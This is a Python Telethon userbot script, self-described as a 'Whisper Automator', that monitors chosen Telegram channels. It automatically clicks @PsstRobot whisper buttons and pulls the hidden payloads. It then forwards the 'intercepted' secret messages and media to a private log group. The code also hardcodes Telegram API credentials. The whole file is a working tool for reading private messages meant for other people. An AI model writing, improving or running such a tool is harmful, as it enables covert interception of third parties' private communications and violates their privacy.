import asyncio
from datetime import datetime
import os
import re
import sys
import time
import traceback
from aiohttp import web
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ==================== CONFIGURATION ====================
API_ID = 23782654
API_HASH = "5b001caca4f436c940fea5e060f0a3c0"
SESSION_STRING = os.environ.get("SESSION_STRING")

# Default Target Channels (Startup Only)
TARGET_CHANNELS = [
    "chatpateee",
    -1002133821583,
    "its_diyaa",
    -1004469467503,
    "UnhingedAspirand",
    -1003954728685,
    "channelizpublick",
    -1004303326817,
    "fewmehh",
    -1004466801780,
    "vidsyapin",
    -1004293474310,
]

WHISPER_BOT_ID = 518335359  # @PsstRobot
LOG_GROUP_ID = -1004402300724

ctx = {"title": "Target Channel", "link": "#", "time": 0}
client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)


# ==================== CONFIG PERSISTENCE ====================
async def load_config():
    global TARGET_CHANNELS
    try:
        async for msg in client.iter_messages(
            LOG_GROUP_ID, search="#WHISPER_CONFIG"
        ):
            if msg.text and "#WHISPER_CONFIG" in msg.text:
                lines = msg.text.split("\n")
                new_list = []
                for line in lines[1:]:
                    line = line.strip(" `•")
                    if not line:
                        continue
                    if line.lstrip("-").isdigit():
                        new_list.append(int(line))
                    else:
                        new_list.append(line.lower())
                if new_list:
                    TARGET_CHANNELS = list(set(new_list))
                break
    except Exception as e:
        print(f"⚠️ Config Load Error: {e}", flush=True)


async def save_config():
    unique_targets = sorted(list(set(TARGET_CHANNELS)), key=lambda x: str(x))
    text = "#WHISPER_CONFIG\n"
    for c in unique_targets:
        text += f"• `{c}`\n"
    try:
        found_msg = None
        async for msg in client.iter_messages(
            LOG_GROUP_ID, search="#WHISPER_CONFIG"
        ):
            if msg.text and "#WHISPER_CONFIG" in msg.text:
                found_msg = msg
                break
        if found_msg:
            await found_msg.edit(text)
        else:
            await client.send_message(LOG_GROUP_ID, text)
    except Exception as e:
        print(f"❌ Config Save Error: {e}", flush=True)


def is_target_chat(event):
    chat_id = event.chat_id
    username = getattr(event.chat, "username", None)
    for target in TARGET_CHANNELS:
        if isinstance(target, int) and target == chat_id:
            return True
        if (
            isinstance(target, str)
            and username
            and target.lower() == username.lower()
        ):
            return True
    return False


# ==================== HELPERS ====================
def format_log(content, chat_name, speed, msg_link, is_media=False):
    tag = " (Advanced Media)" if is_media else ""
    return (
        f"🔓 **Whisper Intercepted{tag}!**\n\n"
        f"📝 **Secret Message:**\n`{content}`\n\n"
        f"📍 **Channel:** {chat_name}\n"
        f"⚡ **Speed:** `{speed} ms`\n"
        f"🔗 [Message Link]({msg_link})"
    )


async def get_msg_link(event):
    try:
        chat = await event.get_chat()
        if getattr(chat, "username", None):
            return f"https://t.me/{chat.username}/{event.id}"
        return (
            f"https://t.me/c/{str(event.chat_id).replace('-100', '')}/{event.id}"
        )
    except Exception:
        return "#"


# ==================== COMMANDS HANDLER ====================
@client.on(
    events.NewMessage(
        chats=[LOG_GROUP_ID], pattern=r"^/(add|del|list)(?:\s+(.+))?"
    )
)
async def command_handler(event):
    global TARGET_CHANNELS  # Fix: Declared right at the top
    cmd = event.pattern_match.group(1).lower()
    arg = event.pattern_match.group(2)

    if cmd == "list":
        await load_config()
        text = "📋 **Active Targets:**\n\n" + "\n".join(
            [f"• `{c}`" for c in TARGET_CHANNELS]
        )
        await event.reply(text)
        return

    if not arg:
        return await event.reply(
            "⚠️ **Usage:** `/add <channel>` or `/del <channel>`"
        )

    input_val = arg.strip().replace("@", "").replace("https://t.me/", "")
    resolved_id = None
    try:
        ent = await client.get_entity(input_val)
        if getattr(ent, "id", None):
            resolved_id = int(
                f"-100{ent.id}"
                if not str(ent.id).startswith("-100")
                else ent.id
            )
    except Exception:
        pass

    if cmd == "add":
        if input_val.lower() not in [str(c).lower() for c in TARGET_CHANNELS]:
            TARGET_CHANNELS.append(input_val.lower())
        if resolved_id and resolved_id not in TARGET_CHANNELS:
            TARGET_CHANNELS.append(resolved_id)
        await save_config()
        await event.reply(f"✅ **Added:** `{input_val}` (ID: `{resolved_id}`)")

    elif cmd == "del":
        initial_len = len(TARGET_CHANNELS)
        TARGET_CHANNELS = [
            c
            for c in TARGET_CHANNELS
            if str(c).lower() != input_val.lower() and c != resolved_id
        ]

        if len(TARGET_CHANNELS) < initial_len:
            await save_config()
            await event.reply(
                f"🗑️ **Removed:** `{input_val}` and its associated ID."
            )
        else:
            await event.reply(
                f"❓ **Channel `{input_val}` not found in list.**"
            )


# ==================== WHISPER ENGINE ====================
@client.on(events.NewMessage())
async def main_handler(event):
    if not is_target_chat(event) or not event.buttons:
        return

    start_time = time.perf_counter()
    chat_name = event.chat.title if event.chat else "Target"
    msg_link = await get_msg_link(event)

    try:
        payload = None
        for row in event.buttons:
            for btn in row:
                if btn.url and "PsstRobot?start=" in btn.url:
                    payload = btn.url.split("start=")[-1]

        res = await event.click(0)
        popup_text = (
            res.message
            if hasattr(res, "message") and res.message
            else (res if isinstance(res, str) else "")
        )

        if popup_text and "-wh::" in popup_text:
            match = re.search(r"-wh::[a-zA-Z0-9_=]+", popup_text)
            if match:
                payload = match.group(0)

        if payload or "advanced" in popup_text.lower():
            ctx.update(
                {"title": chat_name, "link": msg_link, "time": start_time}
            )
            await client.send_message(
                WHISPER_BOT_ID, f"/start {payload}" if payload else "/start"
            )
        elif popup_text:
            elapsed = round((time.perf_counter() - start_time) * 1000, 2)
            await client.send_message(
                LOG_GROUP_ID,
                format_log(popup_text, chat_name, elapsed, msg_link),
                link_preview=False,
            )

    except Exception as e:
        print(f"❌ Error: {e}", flush=True)


@client.on(events.NewMessage(from_users=WHISPER_BOT_ID))
async def bot_dm_handler(event):
    if event.buttons:
        await event.click(0)
        return
    if event.message.text and any(
        x in event.message.text for x in ["Preparing", "/start"]
    ):
        return

    try:
        now = time.perf_counter()
        elapsed = round((now - ctx["time"]) * 1000, 2)
        media_desc = event.message.text or "[Media Content]"
        msg = format_log(
            media_desc, ctx["title"], elapsed, ctx["link"], is_media=True
        )
        await client.send_message(
            LOG_GROUP_ID,
            msg,
            file=event.message.media,
            link_preview=False,
        )
        await client.send_read_acknowledge(event.chat_id)
    except Exception as e:
        print(f"❌ DM Error: {e}", flush=True)


# ==================== STARTUP ====================
async def handle_ping(request):
    return web.Response(text="Bot Active")


async def main():
    await client.start()
    app = web.Application()
    app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(
        runner, "0.0.0.0", int(os.environ.get("PORT", 10000))
    ).start()

    await client.get_dialogs()
    await load_config()

    await client.send_message(
        LOG_GROUP_ID,
        "🤖 **Whisper Automator V3 (Fixed Scope Error) Online!**",
    )
    print("🟢 SYSTEM ONLINE", flush=True)
    await client.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())
